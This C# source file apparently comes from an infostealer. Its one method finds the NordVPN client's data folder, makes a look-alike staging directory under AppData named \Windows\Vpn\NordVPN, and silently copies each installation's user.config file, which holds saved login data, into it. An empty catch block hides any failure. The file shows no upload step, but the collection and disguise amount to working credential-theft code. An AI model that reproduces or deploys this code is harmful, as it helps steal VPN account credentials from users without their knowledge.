using System;
using System.IO;

namespace Nordvpn
{
    class nord
    {
        public static void vpn()
        {
            try
            {
                string dir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                if (Directory.Exists(dir + @"\NordVPN"))
                {
                    string[] dirs = Directory.GetDirectories(dir + @"\NordVPN");
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Vpn\NordVPN");
                    foreach (string d1rs in dirs)
                    {
                        if (d1rs.StartsWith(dir + @"\NordVPN" + @"\NordVPN.exe"))
                        {
                            string dirName = new DirectoryInfo(d1rs).Name;
                            string[] d1 = Directory.GetDirectories(d1rs);
                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Vpn\NordVPN\" + dirName + @"\" + new DirectoryInfo(d1[0]).Name);
                            File.Copy(d1[0] + @"\user.config", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Vpn\NordVPN\" + dirName + @"\" + new DirectoryInfo(d1[0]).Name + @"\user.config");
                        }
                    }
                }
            }
            catch
            {

            }

        }
    }
}
